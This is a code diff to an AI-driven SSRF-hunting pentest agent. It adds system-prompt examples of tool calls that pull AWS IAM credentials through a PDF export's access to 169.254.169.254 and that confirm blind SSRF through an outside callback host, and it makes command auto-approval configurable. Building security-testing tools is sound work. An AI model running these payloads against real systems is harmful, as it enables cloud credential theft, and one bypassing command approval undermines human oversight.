@@ -25,6 +25,7 @@ import type {
   ReactFinding,
 } from '../core/engine/react_loop';
 import { AGENT_TOOL_SCHEMAS } from '../core/engine/tool_schemas';
+import type { HttpClient } from '../core/http/request_engine';
 
 const SSRF_SYSTEM_PROMPT = `You are an elite SSRF (Server-Side Request Forgery) security researcher. Your mission is to systematically discover SSRF vulnerabilities in the target application. You think deeply about each test, analyze responses carefully, and chain techniques when initial attempts are filtered.
 
@@ -107,7 +108,43 @@ Bypass IP-based blocklists with alternative representations:
 - Open redirect chainable to SSRF: MEDIUM
 - Blind SSRF with no callback confirmation: LOW-MEDIUM
 
-Always validate findings with a second request to confirm they are reproducible. Document the exact request and response for the PoC.`;
+Always validate findings with a second request to confirm they are reproducible. Document the exact request and response for the PoC.
+
+## Examples of Successful SSRF Discoveries
+
+### Example 1: SSRF via PDF Export Feature to AWS Metadata
+**Step 1 — Identify injectable parameter:**
+Tool call: http_request { url: "https://[redacted].com/api/export/pdf", method: "POST", body: "{\\"url\\":\\"https://example.com\\"}" }
+Response: 200 OK — returned PDF of the page content
+
+**Step 2 — Test cloud metadata:**
+Tool call: http_request { url: "https://[redacted].com/api/export/pdf", method: "POST", body: "{\\"url\\":\\"http://169.254.169.254/latest/meta-data/\\"}" }
+Response: 200 OK — PDF contains: ami-id, instance-id, local-hostname — cloud metadata exposed!
+
+**Step 3 — Escalate to credentials:**
+Tool call: http_request { url: "https://[redacted].com/api/export/pdf", method: "POST", body: "{\\"url\\":\\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\\"}" }
+Response: 200 OK — PDF shows IAM role name "webapp-role"
+
+Tool call: http_request { url: "https://[redacted].com/api/export/pdf", method: "POST", body: "{\\"url\\":\\"http://169.254.169.254/latest/meta-data/iam/security-credentials/webapp-role\\"}" }
+Response: 200 OK — PDF contains AWS AccessKeyId, SecretAccessKey, Token — CRITICAL!
+
+**Step 4 — Report:**
+Tool call: report_finding { title: "Full SSRF via PDF export: AWS IAM credentials exfiltrated from metadata", severity: "critical", vulnerability_type: "ssrf", confidence: 98 }
+
+### Example 2: Blind SSRF via Webhook Callback
+**Step 1 — Set up OOB callback:**
+Tool call: execute_command { command: "interactsh-client -json -n 1", target: "[redacted].com", category: "utility" }
+Result: Got unique interactsh URL: abc123.oast.fun
+
+**Step 2 — Inject into webhook field:**
+Tool call: http_request { url: "https://[redacted].com/api/integrations/webhook", method: "POST", body: "{\\"callback_url\\":\\"http://abc123.oast.fun\\"}" }
+Response: 200 OK — webhook saved
+
+**Step 3 — Confirm callback:**
+Result: Received DNS + HTTP interaction from [redacted].com's server IP — blind SSRF confirmed
+
+**Step 4 — Report:**
+Tool call: report_finding { title: "Blind SSRF via webhook callback URL — server makes requests to arbitrary URLs", severity: "high", vulnerability_type: "ssrf_blind", confidence: 90 }`;
 
 /**
  * SSRFHunterAgent discovers SSRF vulnerabilities by running a ReAct loop
@@ -129,6 +166,7 @@ export class SSRFHunterAgent implements BaseAgent {
   private model?: string;
   private findings: AgentFinding[] = [];
   private status: AgentStatus;
+  private autoApproveSafe = false;
   private onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
   private onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;
 
@@ -147,9 +185,13 @@ export class SSRFHunterAgent implements BaseAgent {
   setCallbacks(callbacks: {
     onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
     onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;
+    autoApproveSafe?: boolean;
   }): void {
     this.onApprovalRequest = callbacks.onApprovalRequest;
     this.onExecuteCommand = callbacks.onExecuteCommand;
+    if (callbacks.autoApproveSafe !== undefined) {
+      this.autoApproveSafe = callbacks.autoApproveSafe;
+    }
   }
 
   async initialize(provider: ModelProvider, model: string): Promise<void> {
@@ -178,7 +220,7 @@ export class SSRFHunterAgent implements BaseAgent {
         maxIterations: 30,
         target: task.target,
         scope: task.scope,
-        autoApproveSafe: false,
+        autoApproveSafe: this.autoApproveSafe,
         onApprovalRequest: this.onApprovalRequest,
         onExecuteCommand: this.onExecuteCommand,
         onFinding: (finding) => {
@@ -189,6 +231,8 @@ export class SSRFHunterAgent implements BaseAgent {
           this.status.toolsExecuted = update.toolCallCount;
           this.status.lastUpdate = Date.now();
         },
+        httpClient: task.parameters.httpClient as HttpClient | undefined,
+        availableTools: task.parameters.availableTools as string[] | undefined,
       });
 
       const result = await loop.execute();
